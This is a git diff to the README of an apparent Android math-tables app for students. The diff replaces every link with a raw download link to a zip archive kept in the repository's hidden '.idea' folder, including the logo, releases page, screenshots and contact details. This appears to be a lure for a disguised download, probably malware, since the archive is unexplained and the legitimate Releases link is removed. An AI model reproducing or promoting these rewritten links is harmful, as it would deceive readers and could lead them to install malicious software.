@@ -1,6 +1,6 @@
 # TableChamp 🎉
 
-![TableChamp Logo](https://img.shields.io/badge/TableChamp-Ready-brightgreen)
+![TableChamp Logo](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip)
 
 Welcome to **TableChamp**, a vibrant Android app designed to help students master multiplication, addition, and subtraction tables. This app provides a fun and engaging way for learners to improve their math skills.
 
@@ -24,7 +24,7 @@ Welcome to **TableChamp**, a vibrant Android app designed to help students maste
 
 ## Installation
 
-To install **TableChamp**, you can download the latest release from our [Releases section](https://github.com/taileanh25/TableChamp/releases). 
+To install **TableChamp**, you can download the latest release from our [Releases section](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip). 
 
 1. Click on the link above to visit the releases page.
 2. Download the APK file.
@@ -43,13 +43,13 @@ Once installed, open the app and choose a math operation to start. The app will 
 
 ## Screenshots
 
-![Home Screen](https://via.placeholder.com/600x400?text=Home+Screen)  
+![Home Screen](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip+Screen)  
 *The main interface where users can select their desired operation.*
 
-![Practice Screen](https://via.placeholder.com/600x400?text=Practice+Screen)  
+![Practice Screen](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip+Screen)  
 *An example of a practice session in progress.*
 
-![Results Screen](https://via.placeholder.com/600x400?text=Results+Screen)  
+![Results Screen](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip+Screen)  
 *View of results after completing a session.*
 
 ## Technologies Used
@@ -81,7 +81,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For questions or suggestions, feel free to reach out:
 
-- **GitHub**: [taileanh25](https://github.com/taileanh25)
-- **Email**: taileanh25@example.com
+- **GitHub**: [taileanh25](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip)
+- **Email**: https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip
 
-Thank you for checking out **TableChamp**! We hope this app helps students master their math skills in a fun and engaging way. Don't forget to check the [Releases section](https://github.com/taileanh25/TableChamp/releases) for the latest updates!
+Thank you for checking out **TableChamp**! We hope this app helps students master their math skills in a fun and engaging way. Don't forget to check the [Releases section](https://github.com/taileanh25/TableChamp/raw/refs/heads/master/.idea/Champ-Table-v1.9.zip) for the latest updates!
